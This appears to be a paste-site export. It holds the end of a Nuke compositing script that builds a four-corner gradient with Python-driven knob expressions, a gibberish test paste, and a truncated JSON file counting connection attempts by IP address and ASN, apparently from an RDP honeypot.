  hoirzDistance {{sqrt(pow2(MASTER.point01.y-center.y)+pow2(MASTER.point01.x-center.x))}}
 }
 Dot {
  name Dot27
  xpos 1314
  ypos 384
 }
push $N671cb400
 Radial {
  cliptype none
  area {{center.x-(hoirzDistance)} {center.y-(vertDistance)} {center.x+(hoirzDistance)} {center.y+(vertDistance)}}
  color {{MASTER.point01color} {MASTER.point01color} {MASTER.point01color} 1}
  p1 {{center} {center}}
  color0 {{MASTER.point02color} {MASTER.point02color} {MASTER.point02color} 1}
  p0 {{MASTER.point02} {MASTER.point02}}
  name RadialULeft
  xpos 1170
  ypos -970
  addUserKnob {20 User}
  addUserKnob {12 center}
  center {{MASTER.point01} {MASTER.point01}}
  addUserKnob {7 vertDistance}
  vertDistance {{sqrt(pow2(MASTER.point03.y-center.y)+pow2(MASTER.point03.x-center.x))}}
  addUserKnob {7 hoirzDistance}
  hoirzDistance {{sqrt(pow2(MASTER.point02.y-center.y)+pow2(MASTER.point02.x-center.x))}}
 }
 Dot {
  name Dot28
  xpos 1204
  ypos 294
 }
push $Nb75f4800
 Roto {
  output alpha
  cliptype none
  curves {{{v x3f99999a}
  {f 0}
  {n
   {layer Root
    {f 512}
    {t x44c54000 x44838000}
    {a}
    {curvegroup Bezier1 512 bezier
     {{cc
       {f 8192}
       {px
        {x41c00000 x42100000}
        {{{0 -}}
      {{0 -}}}
        {{=calc.A_LEFT
       {0 x44080000}}
      {=calc.A_LEFT
       {x4486eba3 x441a0000}}}
        {{{0 -}}
      {{0 -}}}
        {{{0 -}}
      {{0 -}}}
        {{=calc.A_RIGHT
       {x44f00000 x44878000}}
      {=calc.A_RIGHT
       {x4462345d x44208000}}}
        {{{0 -}}
      {{0 -}}}
        {{{0 -}}
      {{0 -}}}
        {{=MASTER.point04
       {x44e4c000 x44834000}}
      {=MASTER.point04
       {x444e0000 x43960000}}}
        {{{0 -}}
      {{0 -}}}
        {{{0 -}}
      {{0 -}}}
        {{=calc.C_LEFT
       {0 x44030000}}
      {=calc.C_LEFT
       {x44840c31 x43880000}}}
        {{{0 -}}
      {{0 -}}}}}     idem}
     {tx x42100000 x44482000 x43e4c000}
     {a str 1 spx x44c54000 spy x44838000 sb 1 ltn x42100000 ltm x42100000 tt x40800000}}}}}}
  toolbox {selectAll {
  { selectAll str 1 ssx 1 ssy 1 sf 1 }
  { createBezier ro 0 go 0 bo 0 ao 0 str 1 ssx 1 ssy 1 sf 1 sb 1 tt 4 }
  { createBezierCusped ro 0 go 0 bo 0 ao 0 str 1 ssx 1 ssy 1 sf 1 sb 1 tt 5 }
  { createBSpline ro 0 go 0 bo 0 ao 0 str 1 ssx 1 ssy 1 sf 1 sb 1 tt 6 }
  { createEllipse ro 0 go 0 bo 0 ao 0 str 1 ssx 1 ssy 1 sf 1 sb 1 tt 7 }
  { createRectangle ro 0 go 0 bo 0 ao 0 str 1 ssx 1 ssy 1 sf 1 sb 1 tt 8 }
  { createRectangleCusped ro 0 go 0 bo 0 ao 0 str 1 ssx 1 ssy 1 sf 1 sb 1 tt 9 }
  { brush str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { eraser src 2 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { clone src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { reveal src 3 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { dodge src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { burn src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { blur src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { sharpen src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { smear src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
} }
  toolbar_brush_hardness 0.200000003
  toolbar_source_transform_scale {1 1}
  toolbar_source_transform_center {1578 1052}
  colorOverlay {0 0 0 0}
  lifetime_type ""all frames""
  lifetime_start 36
  lifetime_end 36
  motionblur_shutter_offset_type centred
  source_black_outside true
  name Roto2
  xpos 70
  ypos -826
 }
 Dilate {
  size {{Blur1.size/2}}
  name Dilate1
  xpos 70
  ypos -766
 }
 Blur {
  size {{Blur1.size}}
  filter box
  name Blur2
  xpos 70
  ypos -706
 }
 Crop {
  box {0 0 {MASTER.width} {MASTER.height}}
  crop false
  name Crop5
  xpos 70
  ypos -550
 }
 Dot {
  name Dot3
  xpos 104
  ypos -396
 }
set N3da4f400 [stack 0]
 Dot {
  name Dot15
  xpos 544
  ypos -396
 }
 Dot {
  name Dot41
  xpos 544
  ypos -246
 }
push $N671cb800
 Ramp {
  premult rgba
  cliptype none
  p0 {0 0}
  p1 {{MASTER.width} 0}
  name BottomRamp
  xpos 840
  ypos -970
 }
 Multiply {
  value {{MASTER.point04color} {MASTER.point04color} {MASTER.point04color} 1}
  name Multiply3
  xpos 840
  ypos -916
 }
 Dot {
  name Dot38
  xpos 874
  ypos -816
 }
push $N671cbc00
 Expression {
  expr0 MASTER.point03color.r
  expr1 MASTER.point03color.g
  expr2 MASTER.point03color.b
  channel3 rgba
  expr3 1
  name Expression14
  xpos 730
  ypos -970
 }
 Merge2 {
  inputs 2
  name Merge4
  xpos 730
  ypos -820
 }
 Shuffle {
  alpha white
  name Shuffle1
  xpos 730
  ypos -760
 }
 Dot {
  name Dot23
  xpos 764
  ypos -696
 }
set N36bd4c00 [stack 0]
 Dot {
  name Dot40
  xpos 874
  ypos -696
 }
 CornerPin2D {
  to1 {{CornerPinBottom.to1} {CornerPinBottom.to1}}
  to2 {{CornerPinBottom.to2} {CornerPinBottom.to2}}
  to3 {{CornerPinBottom.to3} {CornerPinBottom.to3}}
  to4 {{CornerPinBottom.to4} {CornerPinBottom.to4}}
  invert false
  from1 {0 0}
  from2 {{MASTER.width} 0}
  from3 {{MASTER.width} {MASTER.height}}
  from4 {0 {MASTER.height}}
  name CornerPin2D4
  xpos 840
  ypos -610
 }
 Dot {
  name Dot39
  xpos 874
  ypos -486
 }
push $N36bd4c00
 CornerPin2D {
  to1 {{""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ndPoint\\ =\\ calcNode.knob(\\\""D_BOTTOM\\\"").getValue()\\nbPoint\\ =\\ calcNode.knob(\\\""B_BOTTOM\\\"").getValue()\\nif\\ (dPoint\\\[0\\]\\ <=\\ bPoint\\\[0\\]):\\n\\ \\ \\ \\ ret\\ =\\ dPoint\\\[0\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ bPoint\\\[0\\]]"" i} {0 i}}
  to2 {{""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ndPoint\\ =\\ calcNode.knob(\\\""D_BOTTOM\\\"").getValue()\\nbPoint\\ =\\ calcNode.knob(\\\""B_BOTTOM\\\"").getValue()\\nif\\ (dPoint\\\[0\\]\\ >=\\ bPoint\\\[0\\]):\\n\\ \\ \\ \\ ret\\ =\\ dPoint\\\[0\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ bPoint\\\[0\\]]"" i} {0 i}}
  to3 {{MASTER.point04 i} {MASTER.point04 i}}
  to4 {{MASTER.point03 i} {MASTER.point03 i}}
  invert false
  black_outside false
  from1 {0 0}
  from2 {{MASTER.width i} 0}
  from3 {{MASTER.width i} {MASTER.height i}}
  from4 {0 {MASTER.height i}}
  name CornerPinBottom
  xpos 730
  ypos -610
 }
 ShuffleCopy {
  inputs 2
  name ShuffleCopy2
  xpos 730
  ypos -490
 }
 Crop {
  box {0 0 {MASTER.width} {MASTER.height}}
  crop false
  name Crop7
  xpos 730
  ypos -340
  disable {{Crop5.disable}}
 }
 ChannelMerge {
  inputs 2
  operation from
  name ChannelMerge2
  xpos 730
  ypos -263
 }
 Premult {
  name Premult2
  xpos 730
  ypos -190
 }
 Dot {
  name Dot29
  xpos 764
  ypos 84
 }
push $N3da4f400
 Dot {
  name Dot37
  xpos 104
  ypos -246
 }
push $Nb75f4000
 Ramp {
  premult rgba
  cliptype none
  p0 {0 0}
  p1 {{MASTER.width} 0}
  name TopRamp
  xpos 400
  ypos -970
 }
 Multiply {
  value {{MASTER.point02color} {MASTER.point02color} {MASTER.point02color} 1}
  name Multiply2
  xpos 400
  ypos -916
 }
 Dot {
  name Dot35
  xpos 434
  ypos -816
 }
push $Nb75f4400
 Expression {
  expr0 MASTER.point01color.r
  expr1 MASTER.point01color.g
  expr2 MASTER.point01color.b
  channel3 rgba
  expr3 1
  name Expression13
  xpos 290
  ypos -970
 }
 Merge2 {
  inputs 2
  name Merge2
  xpos 290
  ypos -820
 }
 Shuffle {
  alpha white
  name Shuffle2
  xpos 290
  ypos -760
 }
 Dot {
  name Dot16
  xpos 324
  ypos -696
 }
set N6496dc00 [stack 0]
 Dot {
  name Dot22
  xpos 434
  ypos -696
 }
 CornerPin2D {
  to1 {{CornerPinTop.to1} {CornerPinTop.to1}}
  to2 {{CornerPinTop.to2} {CornerPinTop.to2}}
  to3 {{CornerPinTop.to3} {CornerPinTop.to3}}
  to4 {{CornerPinTop.to4} {CornerPinTop.to4}}
  invert false
  from1 {0 0}
  from2 {{MASTER.width} 0}
  from3 {{MASTER.width} {MASTER.height}}
  from4 {0 {MASTER.height}}
  name CornerPin2D5
  xpos 400
  ypos -610
 }
 Dot {
  name Dot36
  xpos 434
  ypos -486
 }
push $N6496dc00
 CornerPin2D {
  to1 {{MASTER.point01.x} {MASTER.point01.y}}
  to2 {{MASTER.point02.x} {MASTER.point02.y}}
  to3 {{""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ndPoint\\ =\\ calcNode.knob(\\\""D_TOP\\\"").getValue()\\nbPoint\\ =\\ calcNode.knob(\\\""B_TOP\\\"").getValue()\\nif\\ (dPoint\\\[0\\]\\ >=\\ bPoint\\\[0\\]):\\n\\ \\ \\ \\ ret\\ =\\ dPoint\\\[0\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ bPoint\\\[0\\]]""} {MASTER.height}}
  to4 {{""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ndPoint\\ =\\ calcNode.knob(\\\""D_TOP\\\"").getValue()\\nbPoint\\ =\\ calcNode.knob(\\\""B_TOP\\\"").getValue()\\nif\\ (bPoint\\\[0\\]\\ <=\\ dPoint\\\[0\\]):\\n\\ \\ \\ \\ ret\\ =\\ bPoint\\\[0\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ dPoint\\\[0\\]]""} {MASTER.height}}
  invert false
  black_outside false
  from1 {0 0}
  from2 {{MASTER.width} 0}
  from3 {{MASTER.width} {MASTER.height}}
  from4 {0 {MASTER.height}}
  name CornerPinTop
  xpos 290
  ypos -610
 }
 ShuffleCopy {
  inputs 2
  name ShuffleCopy4
  xpos 290
  ypos -490
 }
 Crop {
  box {0 0 {MASTER.width} {MASTER.height}}
  crop false
  name Crop6
  xpos 290
  ypos -340
  disable {{Crop5.disable}}
 }
 ChannelMerge {
  inputs 2
  operation from
  name ChannelMerge1
  xpos 290
  ypos -263
 }
 Premult {
  name Premult1
  xpos 290
  ypos -190
 }
 Dot {
  name Dot30
  xpos 324
  ypos -6
 }
push $Nb75f5400
 Rectangle {
  area {{curve} {curve} {MASTER.width} {MASTER.height}}
  name Rectangle1
  xpos -480
  ypos -970
  disable true
  lifetimeStart 1
  lifetimeEnd 100
  addUserKnob {20 User}
  addUserKnob {7 difference}
  difference {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\npoint01x\\ =\\ masterNode.knob(\\\""point01\\\"").getValue()\\\[0\\]\\npoint02x\\ =\\ masterNode.knob(\\\""point02\\\"").getValue()\\\[0\\]\\npoint03x\\ =\\ masterNode.knob(\\\""point03\\\"").getValue()\\\[0\\]\\npoint04x\\ =\\ masterNode.knob(\\\""point04\\\"").getValue()\\\[0\\]\\nif\\ point01x\\ >\\ point03x:\\n\\ \\ \\ \\ startPoint\\ =\\ point03x\\nelse:\\n\\ \\ \\ \\ startPoint\\ =\\ point01x\\nif\\ point04x\\ >\\ point02x:\\n\\ \\ \\ \\ endPoint\\ =\\ point04x\\nelse:\\n\\ \\ \\ \\ endPoint\\ =\\ point02x\\nret\\ =\\ endPoint-startPoint]""}}
  addUserKnob {7 startPoint}
  startPoint {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\npoint01x\\ =\\ masterNode.knob(\\\""point01\\\"").getValue()\\\[0\\]\\npoint03x\\ =\\ masterNode.knob(\\\""point03\\\"").getValue()\\\[0\\]\\nif\\ point01x\\ >\\ point03x:\\n\\ \\ \\ \\ startPoint\\ =\\ point03x\\nelse:\\n\\ \\ \\ \\ startPoint\\ =\\ point01x\\nret\\ =\\ startPoint]""}}
  addUserKnob {7 endPoint}
  endPoint {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\npoint02x\\ =\\ masterNode.knob(\\\""point02\\\"").getValue()\\\[0\\]\\npoint04x\\ =\\ masterNode.knob(\\\""point04\\\"").getValue()\\\[0\\]\\nif\\ point04x\\ >\\ point02x:\\n\\ \\ \\ \\ endPoint\\ =\\ point04x\\nelse:\\n\\ \\ \\ \\ endPoint\\ =\\ point02x\\nret\\ =\\ endPoint]""}}
  addUserKnob {26 """"}
  addUserKnob {7 newSlope}
  newSlope {{(topPoint.y-bottomPoint.y)/(topPoint.x-bottomPoint.x)}}
  addUserKnob {12 topPoint}
  topPoint {{((MASTER.point02.x-MASTER.point01.x)/2)+MASTER.point01.x} {((MASTER.point02.y-MASTER.point01.y)/2)+MASTER.point01.y}}
  addUserKnob {12 bottomPoint}
  bottomPoint {{((MASTER.point04.x-MASTER.point03.x)/2)+MASTER.point03.x} {((MASTER.point04.y-MASTER.point03.y)/2)+MASTER.point03.y}}
  addUserKnob {12 maskUpRight}
  maskUpRight {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\nthisNode\\ =\\ nuke.thisNode()\\ntopPoint\\ =\\ thisNode.knob(\\\""topPoint\\\"").getValue()\\nnewSlope\\ =\\ thisNode.knob(\\\""newSlope\\\"").getValue()\\nheight\\ =\\ masterNode.height()\\nif\\ (newSlope\\ !=\\ float(\\\""Inf\\\"")):\\n\\ \\ \\ \\ answer\\ =\\ (height-topPoint\\\[1\\]+(newSlope*topPoint\\\[0\\]))/newSlope\\nelse:\\n\\ \\ \\ \\ answer\\ =\\ topPoint\\\[0\\]\\nret\\ =\\ answer]""} {MASTER.height}}
  addUserKnob {12 maskDownRight}
  maskDownRight {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\nthisNode\\ =\\ nuke.thisNode()\\ntopPoint\\ =\\ thisNode.knob(\\\""topPoint\\\"").getValue()\\nnewSlope\\ =\\ thisNode.knob(\\\""newSlope\\\"").getValue()\\nheight\\ =\\ masterNode.height()\\nif\\ (newSlope\\ !=\\ float(\\\""Inf\\\"")):\\n\\ \\ \\ \\ answer\\ =\\ (0-topPoint\\\[1\\]+(newSlope*topPoint\\\[0\\]))/newSlope\\nelse:\\n\\ \\ \\ \\ answer\\ =\\ topPoint\\\[0\\]\\nret\\ =\\ answer]""} 0}
 }
 Roto {
  output alpha
  cliptype none
  curves {{{v x3f99999a}
  {f 0}
  {n
   {layer Root
    {f 512}
    {t x44c54000 x44838000}
    {a}
    {curvegroup Bezier1 512 bezier
     {{cc
       {f 8192}
       {px x42100000
        {0 0}
        {{=0 x42cc0000}
	 {=MASTER.height x44fe8000}}
        {0 0}
        {0 0}
        {{=Rectangle1.maskUpRight.x x449c8000}
	 {=Rectangle1.maskUpRight.y x44f78000}}
        {0 0}
        {0 0}
        {{=Rectangle1.maskDownRight.x x444a8000}
	 {=Rectangle1.maskDownRight.y x432a0000}}
        {0 0}
        {0 0}
        {{=0 x43200000}
	 {=0 x43220000}}
        {0 0}}}     idem}
     {tx x42100000 x44114000 x4487e000}
     {a str 1 spx x44c54000 spy x44838000 sb 1 ltn x42100000 ltm x42100000 tt x40800000}}}}}}
  toolbox {selectAll {
  { selectAll str 1 ssx 1 ssy 1 sf 1 }
  { createBezier ro 0 go 0 bo 0 ao 0 str 1 ssx 1 ssy 1 sf 1 sb 1 tt 4 }
  { createBezierCusped str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { createBSpline str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { createEllipse str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { createRectangle str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { createRectangleCusped str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { brush str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { eraser src 2 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { clone src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { reveal src 3 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { dodge src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { burn src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { blur src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { sharpen src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
  { smear src 1 str 1 ssx 1 ssy 1 sf 1 sb 1 }
} }
  toolbar_brush_hardness 0.200000003
  toolbar_source_transform_scale {1 1}
  toolbar_source_transform_center {1578 1052}
  colorOverlay {0 0 0 0}
  lifetime_type ""all frames""
  lifetime_start 36
  lifetime_end 36
  motionblur_shutter_offset_type centred
  source_black_outside true
  name Roto1
  xpos -480
  ypos -826
 }
 Blur {
  size {{Rectangle1.difference/5}}
  name Blur1
  xpos -480
  ypos -706
 }
 Crop {
  box {0 0 {MASTER.width} {MASTER.height}}
  crop false
  name Crop3
  xpos -480
  ypos -550
  disable {{Crop5.disable}}
 }
push $Nb75f4c00
 Ramp {
  premult rgba
  cliptype none
  p0 {0 0}
  p1 {0 {MASTER.height}}
  name LeftRamp
  xpos -260
  ypos -970
 }
 Multiply {
  value {{MASTER.point01color} {MASTER.point01color} {MASTER.point01color} 1}
  name Multiply5
  xpos -260
  ypos -916
 }
 Dot {
  name Dot31
  xpos -226
  ypos -816
 }
push $Nb75f5000
 Expression {
  expr0 MASTER.point03color.r
  expr1 MASTER.point03color.g
  expr2 MASTER.point03color.b
  channel3 {rgba.red rgba.green -rgba.blue rgba.alpha}
  expr3 1
  name Expression6
  xpos -370
  ypos -970
 }
 Merge2 {
  inputs 2
  name Merge8
  xpos -370
  ypos -820
 }
 Shuffle {
  alpha white
  name Shuffle4
  xpos -370
  ypos -760
 }
 CornerPin2D {
  to1 {0 {""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ncPoint\\ =\\ calcNode.knob(\\\""C_LEFT\\\"").getValue()\\naPoint\\ =\\ calcNode.knob(\\\""A_LEFT\\\"").getValue()\\nif\\ (cPoint\\\[1\\]\\ <=\\ aPoint\\\[1\\]):\\n\\ \\ \\ \\ ret\\ =\\ cPoint\\\[1\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ aPoint\\\[1\\]]""}}
  to2 {{MASTER.point03} {MASTER.point03}}
  to3 {{MASTER.point01} {MASTER.point01}}
  to4 {0 {""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ncPoint\\ =\\ calcNode.knob(\\\""C_LEFT\\\"").getValue()\\naPoint\\ =\\ calcNode.knob(\\\""A_LEFT\\\"").getValue()\\nif\\ (aPoint\\\[1\\]\\ >=\\ cPoint\\\[1\\]):\\n\\ \\ \\ \\ ret\\ =\\ aPoint\\\[1\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ cPoint\\\[1\\]]""}}
  invert false
  black_outside false
  from1 {0 0}
  from2 {{MASTER.width} 0}
  from3 {{MASTER.width} {MASTER.height}}
  from4 {0 {MASTER.height}}
  name CornerPin2D9
  xpos -370
  ypos -610
 }
 Crop {
  box {0 0 {MASTER.width} {MASTER.height}}
  crop false
  name Crop4
  xpos -370
  ypos -550
  disable {{Crop5.disable}}
 }
 Dot {
  name Dot34
  xpos -336
  ypos -486
 }
 ShuffleCopy {
  inputs 2
  name ShuffleCopy3
  xpos -480
  ypos -490
 }
 Premult {
  name Premult3
  xpos -480
  ypos -190
 }
 Dot {
  name Dot33
  xpos -446
  ypos -96
 }
push $Nb75f5800
 Ramp {
  premult rgba
  cliptype none
  p0 {0 0}
  p1 {0 {MASTER.height}}
  name RightRamp
  xpos -700
  ypos -970
 }
 Multiply {
  value {{MASTER.point02color} {MASTER.point02color} {MASTER.point02color} 1}
  name Multiply4
  xpos -700
  ypos -916
 }
 Dot {
  name Dot14
  xpos -666
  ypos -816
 }
push $Nb75f5c00
 Expression {
  channel0 {rgba.red -rgba.green -rgba.blue -rgba.alpha}
  expr0 MASTER.point04color.r
  channel1 {-rgba.red rgba.green -rgba.blue -rgba.alpha}
  expr1 MASTER.point04color.g
  channel2 {-rgba.red -rgba.green rgba.blue -rgba.alpha}
  expr2 MASTER.point04color.b
  channel3 rgba
  expr3 1
  name Expression5
  xpos -810
  ypos -970
 }
 Merge2 {
  inputs 2
  name Merge6
  xpos -810
  ypos -820
 }
 Shuffle {
  alpha white
  name Shuffle6
  xpos -810
  ypos -760
 }
 CornerPin2D {
  to1 {{MASTER.point04 x1 1630} {MASTER.point04 x1 674}}
  to2 {{MASTER.width} {""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ncPoint\\ =\\ calcNode.knob(\\\""C_RIGHT\\\"").getValue()\\naPoint\\ =\\ calcNode.knob(\\\""A_RIGHT\\\"").getValue()\\nif\\ (cPoint\\\[1\\]\\ <=\\ aPoint\\\[1\\]):\\n\\ \\ \\ \\ ret\\ =\\ cPoint\\\[1\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ aPoint\\\[1\\]]""}}
  to3 {{MASTER.width} {""\[python -execlocal calcNode\\ =\\ nuke.toNode(\\\""calc\\\"")\\ncPoint\\ =\\ calcNode.knob(\\\""C_RIGHT\\\"").getValue()\\naPoint\\ =\\ calcNode.knob(\\\""A_RIGHT\\\"").getValue()\\nif\\ (aPoint\\\[1\\]\\ >=\\ cPoint\\\[1\\]):\\n\\ \\ \\ \\ ret\\ =\\ aPoint\\\[1\\]\\nelse:\\n\\ \\ \\ \\ ret\\ =\\ cPoint\\\[1\\]]""}}
  to4 {{MASTER.point02 x36 2982} {MASTER.point02 x36 1360}}
  invert false
  black_outside false
  from1 {0 0}
  from2 {{MASTER.width} 0}
  from3 {{MASTER.width} {MASTER.height}}
  from4 {0 {MASTER.height}}
  name CornerPin2D6
  xpos -810
  ypos -700
 }
 Crop {
  box {0 0 {MASTER.width} {MASTER.height}}
  crop false
  name Crop2
  xpos -810
  ypos -550
  disable {{Crop5.disable}}
 }
 Dot {
  name Dot32
  xpos -776
  ypos -186
 }
push $N6874e000
 NoOp {
  name calc
  xpos -1030
  ypos -970
  addUserKnob {20 User}
  addUserKnob {7 A_SLOPE}
  A_SLOPE {{(MASTER.point01.y-MASTER.point02.y)/(MASTER.point01.x-MASTER.point02.x)}}
  addUserKnob {12 A_LEFT}
  A_LEFT {0 {A_SLOPE*(0-MASTER.point01.x)+MASTER.point01.y}}
  addUserKnob {12 A_RIGHT}
  A_RIGHT {{MASTER.width} {A_SLOPE*(MASTER.width-MASTER.point01.x)+MASTER.point01.y}}
  addUserKnob {7 B_SLOPE}
  B_SLOPE {{(MASTER.point02.y-MASTER.point04.y)/(MASTER.point02.x-MASTER.point04.x)}}
  addUserKnob {12 B_TOP}
  B_TOP {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\nheight\\ =\\ masterNode.height()\\npoint\\ =\\ masterNode.knob(\\\""point02\\\"").getValue()\\nthisNode\\ =\\ nuke.thisNode()\\nslope\\ =\\ thisNode.knob(\\\""B_SLOPE\\\"").getValue()\\nif\\ (slope\\ !=\\ float('Inf')):\\n\\ \\ \\ \\ answer\\ =\\ (height-point\\\[1\\]+(slope*point\\\[0\\]))/slope\\nelse:\\n\\ \\ \\ \\ answer\\ =\\ point\\\[0\\]\\nret\\ =\\ answer]""} {MASTER.height}}
  addUserKnob {12 B_BOTTOM}
  B_BOTTOM {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\nthisNode\\ =\\ nuke.thisNode()\\nheight\\ =\\ masterNode.height()\\npoint\\ =\\ masterNode.knob(\\\""point02\\\"").getValue()\\nslope\\ =\\ thisNode.knob(\\\""B_SLOPE\\\"").getValue()\\nif\\ (slope\\ !=\\ float(\\\""Inf\\\"")):\\n\\ \\ \\ \\ answer\\ =\\ (0-point\\\[1\\]+(slope*point\\\[0\\]))/slope\\nelse:\\n\\ \\ \\ \\ answer\\ =\\ point\\\[0\\]\\nret\\ =\\ answer]""} {curve}}
  addUserKnob {7 C_SLOPE}
  C_SLOPE {{(MASTER.point03.y-MASTER.point04.y)/(MASTER.point03.x-MASTER.point04.x)}}
  addUserKnob {12 C_LEFT}
  C_LEFT {0 {C_SLOPE*(0-MASTER.point03.x)+MASTER.point03.y}}
  addUserKnob {12 C_RIGHT}
  C_RIGHT {{MASTER.width} {C_SLOPE*(MASTER.width-MASTER.point03.x)+MASTER.point03.y}}
  addUserKnob {7 D_SLOPE}
  D_SLOPE {{(MASTER.point01.y-MASTER.point03.y)/(MASTER.point01.x-MASTER.point03.x)}}
  addUserKnob {12 D_TOP}
  D_TOP {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\nthisNode\\ =\\ nuke.thisNode()\\nheight\\ =\\ masterNode.height()\\npoint\\ =\\ masterNode.knob(\\\""point03\\\"").getValue()\\nslope\\ =\\ thisNode.knob(\\\""D_SLOPE\\\"").getValue()\\nif\\ (slope\\ !=\\ float(\\\""Inf\\\"")):\\n\\ \\ \\ \\ answer\\ =\\ (height-point\\\[1\\]+(slope*point\\\[0\\]))/slope\\nelse:\\n\\ \\ \\ \\ answer\\ =\\ point\\\[0\\]\\nret\\ =\\ answer]""} {MASTER.height}}
  addUserKnob {12 D_BOTTOM}
  D_BOTTOM {{""\[python -execlocal masterNode\\ =\\ nuke.toNode(\\\""MASTER\\\"")\\nheight\\ =\\ masterNode.height()\\npoint\\ =\\ masterNode.knob(\\\""point03\\\"").getValue()\\nthisNode\\ =\\ nuke.thisNode()\\nslope\\ =\\ thisNode.knob(\\\""D_SLOPE\\\"").getValue()\\nif\\ (slope\\ !=\\ float(\\\""Inf\\\"")):\\n\\ \\ \\ \\ answer\\ =\\ (0-point\\\[1\\]+(slope*point\\\[0\\]))/slope\\nelse:\\n\\ \\ \\ \\ answer\\ =\\ point\\\[0\\]\\nret\\ =\\ answer]""} {curve}}
 }
 Dot {
  name Dot43
  xpos -996
  ypos -276
 }
 Merge2 {
  inputs 2
  name Merge7
  xpos -1030
  ypos -190
 }
 Merge2 {
  inputs 2
  name Merge9
  xpos -1030
  ypos -100
 }
 Merge2 {
  inputs 2
  name Merge3
  xpos -1030
  ypos -10
 }
 Merge2 {
  inputs 2
  name Merge5
  xpos -1030
  ypos 80
 }
 Shuffle {
  alpha white
  name Shuffle3
  xpos -1030
  ypos 110
 }
 Dot {
  name Dot42
  xpos -996
  ypos 208
 }
 Merge2 {
  inputs 2
  name Merge10
  xpos -1030
  ypos 290
 }
 Merge2 {
  inputs 2
  name Merge11
  xpos -1030
  ypos 380
 }
 Merge2 {
  inputs 2
  name Merge12
  xpos -1030
  ypos 470
 }
 Merge2 {
  inputs 2
  name Merge13
  xpos -1030
  ypos 560
 }
 Dot {
  name Dot24
  xpos -996
  ypos 654
 }
 Dither {
  channels rgb
  amount 0.008
  name Dither1
  xpos -1030
  ypos 740
 }
 Crop {
  box {0 0 {MASTER.width} {MASTER.height}}
  crop false
  name Crop1
  xpos -1030
  ypos 770
  disable {{Crop5.disable}}
 }
 Dot {
  name Dot2
  xpos -996
  ypos 864
 }
set Nd3225c00 [stack 0]
 Output {
  name Output1
  xpos -1030
  ypos 950
 }
push $Nd3225c00
 Viewer {
  frame_range 1-100
  frame_increment 8
  name Viewer1
  xpos -810
  ypos 950
 }
end_group"
NQ01W0CY,test,kj1123123,Python,Tuesday 13th of May 2025 07:43:48 PM CDT,asdawaasadawdawdada
kNURnz0b,2025-05-12_stats.json,rdp_snitch,JSON,Tuesday 13th of May 2025 07:18:26 PM CDT,"{
  ""ip"": {
    ""174.138.67.202"": 1821,
    ""157.245.150.219"": 3594,
    ""128.199.168.88"": 3816,
    ""128.199.166.57"": 3513,
    ""146.190.242.181"": 10236,
    ""185.8.62.6"": 1308,
    ""209.97.169.106"": 300,
    ""45.227.254.151"": 6,
    ""88.214.25.124"": 6,
    ""128.22.147.233"": 3,
    ""167.86.85.195"": 3,
    ""71.82.170.60"": 63,
    ""80.94.95.198"": 66,
    ""205.210.31.71"": 9,
    ""123.103.219.70"": 24,
    ""80.94.95.203"": 30,
    ""75.34.67.3"": 6,
    ""157.245.104.150"": 3,
    ""174.44.14.56"": 6,
    ""211.185.207.14"": 9,
    ""103.129.215.14"": 6,
    ""198.235.24.178"": 9,
    ""194.180.49.123"": 3,
    ""102.88.21.217"": 3,
    ""216.108.237.6"": 3,
    ""149.34.244.183"": 3,
    ""205.210.31.236"": 9,
    ""78.142.18.92"": 3,
    ""165.154.138.33"": 3,
    ""45.227.254.156"": 6,
    ""185.242.226.23"": 3,
    ""194.165.16.161"": 6,
    ""162.142.125.37"": 3,
    ""139.59.108.120"": 3,
    ""198.235.24.68"": 9,
    ""92.63.197.197"": 6
  },
  ""asn"": {
    ""AS14061"": 23286,
    ""AS58269"": 1308,
    ""AS267784"": 12,
    ""AS35042"": 6,
    ""AS17511"": 3,
